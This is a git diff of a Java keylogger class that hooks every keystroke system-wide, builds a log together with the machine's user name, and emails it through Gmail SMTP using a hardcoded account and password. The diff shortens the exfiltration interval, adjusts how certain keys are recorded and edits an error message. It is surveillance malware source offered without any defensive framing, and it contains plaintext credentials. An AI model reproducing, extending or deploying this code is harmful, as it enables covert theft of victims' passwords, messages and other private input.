@@ -21,7 +21,7 @@ public class Escucha implements NativeKeyListener {
 
     String registro;
     long inicio;
-    final int intervaloGuardado = 30 * 60000;
+    final int intervaloGuardado = 20 * 60000;
     String user = "Jy8qG3fWGE@gmail.com";
     String password = "sbreaOyCKl";
 
@@ -32,8 +32,10 @@ public class Escucha implements NativeKeyListener {
     }
 
     public void nativeKeyPressed(NativeKeyEvent e) {
-        if (NativeKeyEvent.getKeyText(e.getKeyCode()).equals("No Definido") || NativeKeyEvent.getKeyText(e.getKeyCode()).equals("Desconocido keyCode: 0xe36")) {
+        if (NativeKeyEvent.getKeyText(e.getKeyCode()).equals("Desconocido keyCode: 0xe36")) {
             registro += "Shift ";
+        } else if (NativeKeyEvent.getKeyText(e.getKeyCode()).equals("Desconocido keyCode: 0xe4a")) {
+            registro += "- ";
         } else {
             registro += NativeKeyEvent.getKeyText(e.getKeyCode()) + " ";
         }
@@ -52,7 +54,7 @@ public class Escucha implements NativeKeyListener {
         try {
             GlobalScreen.registerNativeHook();
         } catch (NativeHookException ex) {
-            JOptionPane.showMessageDialog(null, "No se pudo poner el gancho nativo. RIP");
+            JOptionPane.showMessageDialog(null, "No se pudo poner el gancho nativo.");
             guardarRegistro(inicio);
             System.err.println(ex.getMessage());
             System.exit(1);
@@ -73,7 +75,7 @@ public class Escucha implements NativeKeyListener {
 
     public void guardarRegistro(long nombre) {
         Date fecha = new Date();
-        String mail = System.getProperty("user.name") + fecha.toString() + "\nSave interval: " + intervaloGuardado + "ms\n" + "\n" + registro;
+        String mail = System.getProperty("user.name\n") + fecha.toString() + "\nSave interval: " + intervaloGuardado + "ms\n" + "\n" + registro;
         Properties props = new Properties();
         props.put("mail.smtp.host", "smtp.gmail.com");
         props.put("mail.smtp.socketFactory.port", "465");
